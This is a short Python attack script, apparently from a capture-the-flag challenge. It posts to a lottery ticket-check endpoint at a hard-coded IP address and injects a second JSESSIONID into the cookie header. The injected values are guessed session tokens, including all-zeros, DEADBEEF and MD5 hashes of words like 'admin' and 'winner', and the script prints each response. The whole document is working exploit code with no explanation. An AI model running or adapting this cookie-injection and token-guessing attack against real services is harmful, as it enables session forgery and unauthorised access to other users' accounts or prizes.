import requests
import hashlib

url = 'http://94.19.79.169:20001/api/ticket/check'
auth_cookie = '0A1A090B46CFD234D3390FA2D83A44D1'

test_values = [
    '00000000000000000000000000000000',
    '11111111111111111111111111111111',
    'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF',
    'DEADBEEFDEADBEEFDEADBEEFDEADBEEF',
]

for word in ['admin', 'winner', 'ticket-00000000', 'lottery', 'prize', '0', '1']:
    test_values.append(hashlib.md5(word.encode()).hexdigest().upper())

for ticket_cookie in test_values:
    cookies = {'JSESSIONID': f'{auth_cookie}; JSESSIONID={ticket_cookie}'}

    try:
        response = requests.post(url, cookies=cookies, timeout=5)
        result = response.json()
        print(f'{ticket_cookie}: {result.get("message", "")}')
    except Exception as e:
        print(f'{ticket_cookie}: Error - {e}')